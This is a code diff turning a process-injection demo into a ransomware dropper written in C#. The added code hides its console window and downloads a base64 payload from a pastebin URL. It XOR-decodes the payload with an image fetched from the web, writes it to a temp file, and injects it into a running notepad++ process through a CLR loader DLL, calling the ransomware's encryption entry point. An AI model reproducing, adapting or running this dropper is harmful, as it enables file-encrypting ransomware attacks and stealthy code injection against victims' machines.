@@ -6,31 +6,189 @@
  ************************************************************************************************************/
 
  using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.IO;
 
 namespace BisquillaRansomwareDropper
 {
+
     class Program
     {
-        static void Main(string[] args)
+        /// <summary>
+        /// Path to Download Bae64 Ransomware Binary
+        /// </summary>
+        private const string RANSOMWARE_DOWNLOAD_PATH = "https://pastebin.com/raw/0w2YZMhP";
+
+        /// <summary>
+        /// Image Path to be Used as Decryption Key
+        /// </summary>
+        private const string DECRYPTION_IMAGE_URI = "https://extra.globo.com/incoming/5921498-9a8-629/w1920h1080/marte-1.jpg";
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+
+        static int Main(string[] args)
         {
-            String ransomwareBase64DataUri = "";
-            String decryptionKeyDataUri = "";
+            // Hide Console Window
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+            // Extrat DNCI Dependence from Embedded Resource and Save into Temp Folder
+            String clrLoaderLibraryPath = ExtractCppLoader();
+
+            // Download Ransomware to Disk
+            String ransomwareFilePath = DownloadAndSaveToDisk();
+
+
+            /*** Configuration Variables ***/
+            String targetProcessName = "notepad++";     // Define Target Process
+            String clrLoaderLibraryFileName = Path.GetFileName(clrLoaderLibraryPath);
+
+            String targetDotNetAssemblyPath = ransomwareFilePath;
+            String targetDotNetAssemblyEntryPointAssemblyType = "BisquillaRansomware.Program";
+            String targetDotNetAssemblyEntryPointMethodName = "EntryPoint";
+            String targetDotNetAssemblyEntryPointMethodParameters = "E"; // Encryption
+
+            // Find the Process Info
+            Int32 targetProcessId = 0;
+            try
+            {
+                targetProcessId = Process.GetProcessesByName(targetProcessName)[0].Id;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("notepad++ not found");
+                return -1;
+            }
+
+
+
+            /*** Open and get handle of the process - with required privileges ***/
+            IntPtr targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
+            if (targetProcessHandle == null || targetProcessHandle == IntPtr.Zero)
+            {
+                return -1;
+            }
+
+
+
+            /*** Inject CLR Runtime Loader into Remote Process ***/
+            Inject(targetProcessHandle, GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW"), clrLoaderLibraryPath);
+
+
+
+            /*** Get Module (C++ CLR Runtime Loader) Handle ***/
+            IntPtr clrRuntimeLoaderHandle = FindRemoteModuleHandle(targetProcessHandle, clrLoaderLibraryFileName);
+            if (clrRuntimeLoaderHandle == null || clrRuntimeLoaderHandle == IntPtr.Zero)
+            {
+                return -2;
+            }
+
+
+
+            /*** Load .NET Assembly into Remote Process ***/
+
+            // Find LoadDNA Function from C++ CLR Runtime Loader into Remote Process Memory
+            uint targetOffset = GetFunctionOffSet(clrLoaderLibraryPath, "LoadDNA");
+
+            // Compute OffSet into Remote Target
+            uint remoteTargetOffSet = targetOffset + (uint)clrRuntimeLoaderHandle.ToInt32();
+
+            // Build LoadDNA Function Arguments
+            String loadDnaArgs = targetDotNetAssemblyPath + "\t" + targetDotNetAssemblyEntryPointAssemblyType + "\t" + targetDotNetAssemblyEntryPointMethodName + "\t" + targetDotNetAssemblyEntryPointMethodParameters;
+
+            // Inject .NET Assembly using LoadDNA Function on DNCIClrLoader.dll
+            Inject(targetProcessHandle, new IntPtr(remoteTargetOffSet), loadDnaArgs);
+
+
+
+            /*** Remove Module from Remote Process ***/
+
+            // Close Remote Process Handle
+            CloseHandle(targetProcessHandle);
+
+            return 0;
+        }
+
+
+        /// <summary>
+        /// Extract DNCI CPP Loader and Save to Disk
+        /// </summary>
+        /// <returns>File Path</returns>
+        private static string ExtractCppLoader()
+        {
+            String moduleTempFileName = Path.GetTempFileName().Replace(".tmp", ".dll");
+
+            using (FileStream fs = new FileStream(moduleTempFileName, FileMode.Create))
+            {
+                byte[] rawBytes = Convert.FromBase64String(ASCIIEncoding.ASCII.GetString(
+                        Properties.Resources.DNCIClrLoader
+                    )
+                );
+                fs.Write(rawBytes, 0, rawBytes.Length);
+
+                fs.Flush();
+                fs.Close();
+            }
+
+            return moduleTempFileName;
+        }
+
+        /// <summary>
+        /// Download Ransonware and Save into Disk
+        /// </summary>
+        /// <returns>File Path</returns>
+        private static string DownloadAndSaveToDisk()
+        {
 
             // Download Ransomware Base64 Data
+            byte[] encryptedRansomware = System.Convert.FromBase64String(
+                new WebClient().DownloadString(RANSOMWARE_DOWNLOAD_PATH)
+            );
 
             // Download Image from Web (to be used as Ransomware Base64 Data Decryption Key)
+            byte[] key = System.Text.Encoding.UTF8.GetBytes(
+                new WebClient().DownloadString(DECRYPTION_IMAGE_URI)
+            );
+
+            // Decrypt
+            byte[] finalBinary = EncryptDecrypt(encryptedRansomware, key);
+
+            // Target File
+            String targetFilePath = Path.GetTempFileName();
 
             // Inject Into Notepad++
-        }
-    }
+            System.IO.File.WriteAllBytes(targetFilePath, finalBinary);
 
-    class GOT_CODE_FROM_HERE
-    {
+            // Return File Path
+            return targetFilePath;
+        }
+
+        /// <summary>
+        /// Apply OTP Encryption
+        /// </summary>
+        /// <param name="source">Source Data</param>
+        /// <param name="key">Key</param>
+        /// <returns></returns>
+        private static byte[] EncryptDecrypt(byte[] source, byte[] key)
+        {
+            byte[] hResult = new byte[source.Length];
+
+            for (int i = 0; i < source.Length; i++)
+            {
+                hResult[i] = (byte) (source[i] ^ key[i]);
+            }
+
+            return hResult;
+        }
+
         // privileges
         const int PROCESS_TERMINATE = 0x00000001;
         const int PROCESS_CREATE_THREAD = 0x00000002;
@@ -143,73 +301,7 @@ namespace BisquillaRansomwareDropper
             public string szModule;
             [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
             public string szExePath;
-        };
-
-        static int Main(string[] args)
-        {
-
-            /*** Configuration Variables ***/
-            String targetProcessName = "notepad++";     // Define Target Process
-            String clrLoaderLibraryPath = System.IO.Path.Combine(System.IO.Directory.GetCurrentDirectory(), "DNCIClrLoader.dll");   // Get CLR Runtime Loader Path
-            String clrLoaderLibraryFileName = "DNCIClrLoader.dll";  // CLR Runtime Loader DLL Name
-
-            String targetDotNetAssemblyPath = System.IO.Path.Combine(System.IO.Directory.GetCurrentDirectory(), "InjectDemo.Console.ClassicNet.exe");
-            String targetDotNetAssemblyEntryPointAssemblyType = "InjectDemo.Console.ClassicNet.Program";
-            String targetDotNetAssemblyEntryPointMethodName = "EntryPoint";
-            String targetDotNetAssemblyEntryPointMethodParameters = "Parameter String OK";
-
-            // Find the Process Info
-            Int32 targetProcessId = Process.GetProcessesByName(targetProcessName)[0].Id;
-
-
-
-            /*** Open and get handle of the process - with required privileges ***/
-            IntPtr targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
-            if (targetProcessHandle == null || targetProcessHandle == IntPtr.Zero)
-            {
-                return -1;
-            }
-
-
-
-            /*** Inject CLR Runtime Loader into Remote Process ***/
-            Inject(targetProcessHandle, GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW"), clrLoaderLibraryPath);
-
-
-
-            /*** Get Module (C++ CLR Runtime Loader) Handle ***/
-            IntPtr clrRuntimeLoaderHandle = FindRemoteModuleHandle(targetProcessHandle, clrLoaderLibraryFileName);
-            if (clrRuntimeLoaderHandle == null || clrRuntimeLoaderHandle == IntPtr.Zero)
-            {
-                return -2;
-            }
-
-
-
-            /*** Load .NET Assembly into Remote Process ***/
-
-            // Find LoadDNA Function from C++ CLR Runtime Loader into Remote Process Memory
-            uint targetOffset = GetFunctionOffSet(clrLoaderLibraryPath, "LoadDNA");
-
-            // Compute OffSet into Remote Target
-            uint remoteTargetOffSet = targetOffset + (uint)clrRuntimeLoaderHandle.ToInt32();
-
-            // Build LoadDNA Function Arguments
-            String loadDnaArgs = targetDotNetAssemblyPath + "\t" + targetDotNetAssemblyEntryPointAssemblyType + "\t" + targetDotNetAssemblyEntryPointMethodName + "\t" + targetDotNetAssemblyEntryPointMethodParameters;
-
-            // Inject .NET Assembly using LoadDNA Function on DNCIClrLoader.dll
-            Inject(targetProcessHandle, new IntPtr(remoteTargetOffSet), loadDnaArgs);
-
-
-
-            /*** Remove Module from Remote Process ***/
-
-            // Close Remote Process Handle
-            CloseHandle(targetProcessHandle);
-
-            return 0;
         }
-
 
         /// <summary>
         /// Get Target Function OffSet
